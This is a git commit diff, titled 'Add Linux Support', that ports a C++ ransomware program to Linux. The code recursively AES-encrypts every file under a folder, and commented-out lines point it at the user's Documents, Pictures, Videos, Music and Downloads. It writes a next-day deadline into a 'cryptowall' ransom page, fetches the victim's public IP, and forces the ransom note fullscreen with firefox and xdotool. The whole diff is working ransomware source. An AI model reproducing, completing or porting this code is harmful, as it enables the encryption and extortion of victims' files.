64a17e6d89b5d1f726d336891319bc5fc021508c
Адриан <ttfh3500@gmail.com>
2018-12-29 14:17:18 -0300

    Add Linux Support

--- main.cpp
+++ main.cpp
@@ -2,8 +2,15 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
+#include <string.h>
+
+#ifdef _WIN32
 #include <fileapi.h>
 #include <windows.h>
+#else
+#include <unistd.h>
+#include <dirent.h>
+#endif
 
 #include "aes.h"
 
@@ -75,29 +82,50 @@ void EncryptFile(char* fname, const uint8_t* key) {
 }
 
 void SearchFiles(const char* sDir, const uint8_t* key) {
-    WIN32_FIND_DATA fdFile;
-    HANDLE hFind = NULL;
-    char sPath[512];
-    sprintf(sPath, "%s\\*.*", sDir); // Search all files
-    hFind = FindFirstFile(sPath, &fdFile);
-    do {
-        if (strcmp(fdFile.cFileName, ".") != 0 && strcmp(fdFile.cFileName, "..") != 0) {
-            // Build up file path
-            sprintf(sPath, "%s\\%s", sDir, fdFile.cFileName);
-            // Is the entity a File or Folder?
-            if (fdFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
-                SearchFiles(sPath, key); // Recursion
-            else
-                EncryptFile(sPath, key);
-        }
-    } while (FindNextFile(hFind, &fdFile)); // Find the next file
-    FindClose(hFind); // Clean
+#ifdef _WIN32
+  WIN32_FIND_DATA fdFile;
+  HANDLE hFind = NULL;
+  char sPath[512];
+  sprintf(sPath, "%s\\*.*", sDir); // Search all files
+  hFind = FindFirstFile(sPath, &fdFile);
+  do {
+    if (strcmp(fdFile.cFileName, ".") != 0 && strcmp(fdFile.cFileName, "..") != 0) {
+      // Build up file path
+      sprintf(sPath, "%s\\%s", sDir, fdFile.cFileName);
+      // Is it a file or folder?
+      if (fdFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+        SearchFiles(sPath, key); // Recursion
+      else
+        EncryptFile(sPath, key);
+    }
+  } while (FindNextFile(hFind, &fdFile)); // Find the next file
+  FindClose(hFind); // Clean
+#else
+  DIR* dir = opendir(sDir);
+  dirent* entry = readdir(dir);
+  char path[512];
+  while (entry != NULL) {
+    if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
+      sprintf(path, "%s/%s", sDir, entry->d_name);  
+      if (entry->d_type == DT_DIR)
+        SearchFiles(path, key);
+      else
+        EncryptFile(path, key);
+    }
+    entry = readdir(dir);
+  }
+  closedir(dir);
+#endif
 }
 
 int main() {
   /// HIDE CONSOLE
   // Delete the next two slashes to hide console:
+#ifdef _WIN32
   //FreeConsole();
+#else
+  
+#endif
 
   /// GENERATE KEY
   uint8_t key[32];
@@ -113,12 +141,16 @@ int main() {
 
   /// ENCRYPT FILES
   // Encrypt Files in those folders and subfolders:
+#ifdef _WIN32
   SearchFiles("..\\testfolder", key);
   //SearchFiles("C:\\Users\\User\\Music", key);
   //SearchFiles("C:\\Users\\User\\Videos", key);
   //SearchFiles("C:\\Users\\User\\Pictures", key);
   //SearchFiles("C:\\Users\\User\\Documents", key);
   //SearchFiles("C:\\Users\\User\\Downloads", key);
+#else
+  SearchFiles("../testfolder", key);
+#endif
 
   /// GET TIME OF TOMORROW
   time_t time = seed + 24 * 60 * 60;
@@ -127,14 +159,22 @@ int main() {
   unsigned int month = timeinfo->tm_mon + 1;
 
   /// ADD DATE TO FILE
+#ifdef _WIN32
   FILE* cryptowall = fopen("cryptowall\\index.htm", "r+");
+#else
+  FILE* cryptowall = fopen("cryptowall/index.htm", "r+");
+#endif
   fseek(cryptowall, 304, SEEK_SET);
   fprintf(cryptowall, "%02u-%02u-%02u %02u:%02u:%02u", year, month,
           timeinfo->tm_mday, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
 
   /// GET IP
   unsigned int ip[4];
+#ifdef _WIN32
   system("getip.bat");
+#else
+  system("dig @resolver1.opendns.com A myip.opendns.com +short -4 > ip");
+#endif
   FILE* loadip = fopen("ip", "r+");
   fscanf(loadip, "%u.%u.%u.%u", &ip[0], &ip[1], &ip[2], &ip[3]);
   fclose(loadip);
@@ -161,7 +201,15 @@ int main() {
   fclose(cryptowall);
 
   /// SHOW MESSAGE FULLSCREEN
+#ifdef _WIN32
   system("start /b cmd /c \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -new-window cryptowall\\index.htm");
   system("fullscreen.vbs");
+#else
+  system("firefox -new-window cryptowall/index.htm");
+  sleep(2);
+  system("xdotool key Alt+Tab");
+  sleep(1);
+  system("xdotool key F11");
+#endif
   return 0;
 }
